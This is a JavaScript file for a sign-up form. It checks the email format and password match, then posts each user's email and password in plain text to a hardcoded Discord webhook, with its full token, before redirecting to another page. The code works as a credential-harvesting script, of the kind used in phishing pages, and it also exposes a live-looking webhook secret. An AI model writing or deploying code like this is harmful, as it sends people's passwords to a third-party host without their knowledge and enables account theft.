const form = document.getElementById('authForm');
const alertBox = document.getElementById('alert');

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const confirmPassword = document.getElementById('confirmPassword').value;

  if (!isValidEmail(email)) {
    showAlert('Invalid email format');
    return;
  }

  if (password !== confirmPassword) {
    showAlert('Passwords do not match');
    return;
  }

  try {
    const response = await sendDataToWebhook(email, password);
    if (response.ok) {
      alert('Sign up successful!');
      window.location.href = 'website.html';
    } else {
      showAlert('Failed to send data to webhook');
      console.error(response.statusText);
    }
  } catch (error) {
    showAlert('Failed to send data to webhook');
    console.error(error.message);
  }
});

function isValidEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

async function sendDataToWebhook(email, password) {
  const webhookURL = 'https://discord.com/api/webhooks/1230326961507930132/xpnkyP81sRbGJsv-vqLpIuI0gRlF9TjVU_F54U0NJaJtxksT55DHI00sRGdD8xDg7XyN';
  const data = {
    content: `User Sign In/Sign Up: Email: ${email} Password: ${password}`
  };

  const response = await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });

  return response;
}

function showAlert(message) {
  alertBox.textContent = message;
  alertBox.classList.remove('hidden');
  setTimeout(() => {
    alertBox.classList.add('hidden');
  }, 3000);
}
